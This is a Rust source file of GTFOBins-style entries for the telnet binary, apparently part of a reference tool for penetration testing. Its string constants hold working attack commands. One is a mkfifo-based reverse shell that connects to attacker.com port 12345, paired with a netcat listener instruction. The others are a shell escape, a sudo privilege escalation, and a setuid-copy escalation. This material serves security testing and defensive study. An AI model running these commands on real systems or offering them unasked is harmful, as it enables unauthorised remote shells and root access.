pub static BIN_NAME: &'static str = "telnet";
pub static SH_DESC: &'static str = "BSD version only. Needs to be connected first.";
pub static SH_CODE: &'static str = r#"
    
    RHOST=attacker.com
    RPORT=12345
    telnet $RHOST $RPORT
    ^]
    !/bin/sh
"#;
pub static RS_DESC: &'static str = "Run `nc -l -p 12345` on the attacker box to receive the shell.";
pub static RS_CODE: &'static str = r#"
    
    RHOST=attacker.com
    RPORT=12345
    TF=$(mktemp -u)
    mkfifo $TF && telnet $RHOST $RPORT 0<$TF | /bin/sh 1>$TF
"#;
pub static SUDO_DESC: &'static str = "BSD version only. Needs to be connected first.";
pub static SUDO_CODE: &'static str = r#"
    
    RHOST=attacker.com
    RPORT=12345
    sudo telnet $RHOST $RPORT
    ^]
    !/bin/sh
"#;
pub static LSUID_DESC: &'static str = "BSD version only. Needs to be connected first.";
pub static LSUID_CODE: &'static str = r#"
    
    sudo install -m =xs $(which telnet) .

    RHOST=attacker.com
    RPORT=12345
    ./telnet $RHOST $RPORT
    ^]
    !/bin/sh
"#;
use crate::code::{Code, Tag};
pub static SH: Code<'static> = Code { 
	title: "SH_CODE",
	code: SH_CODE,
	tag: Tag::SH,
};
pub static RS: Code<'static> = Code { 
	title: "RS_CODE",
	code: RS_CODE,
	tag: Tag::RS,
};
pub static SUDO: Code<'static> = Code { 
	title: "SUDO_CODE",
	code: SUDO_CODE,
	tag: Tag::SUDO,
};
pub static LSUID: Code<'static> = Code { 
	title: "LSUID_CODE",
	code: LSUID_CODE,
	tag: Tag::LSUID,
};
